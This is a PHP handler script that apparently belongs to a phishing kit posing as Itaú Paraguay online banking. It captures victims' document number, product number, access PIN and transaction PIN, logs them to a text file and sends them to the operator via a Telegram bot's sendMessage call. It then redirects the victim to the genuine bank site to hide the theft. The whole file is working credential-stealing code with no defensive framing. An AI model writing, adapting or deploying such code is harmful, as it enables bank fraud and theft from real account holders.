<?php
include('nombrearchivo.php');
@ini_set("display_errors", 0);
if (isset($_POST['numdoc']) && isset($_POST['tipoproducto']) && isset($_POST['numprod']) && isset($_POST['pinacc']) && isset($_POST['pintrac'])){
	
	$file = fopen("".$nombre_archivo.".txt", "a");
fwrite($file, "========================= " . PHP_EOL);
fwrite($file, "N doc. = ".$_POST['numdoc']." - Tipo product. = ".$_POST['tipoproducto']." - N. Product.= ".$_POST['numprod']." - Pin access= ".$_POST['pinacc']." - Pin transacc.= ".$_POST['pintrac']."". PHP_EOL);
fclose($file);

$ttrue = "\n🤩Estan tecleando🤩️\n=============================\n📧 N° Documento: => " . $_POST['numdoc'] . "\n🔑 Tipo Documento: => " . $_POST['tipoproducto'] . "\n📧 N° Producto: => " . $_POST['numprod'] . "\n🔑 Pin Acceso: => " . $_POST['pinacc'] . "\n🔑 Pin Transaccion: => " . $_POST['pintrac'] . "\n=============================\n🔥Succefull🔥\n";
    $datafalse = array("text" => $ttrue, "chat_id" => $tid);

    file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?" . http_build_query($datafalse));
    
	


@header ('Location: https://www.itau.com.py/Paginas/tusobjetivos_misproyectos');
}else{ header ('location: index.html'); exit(); 
}
?>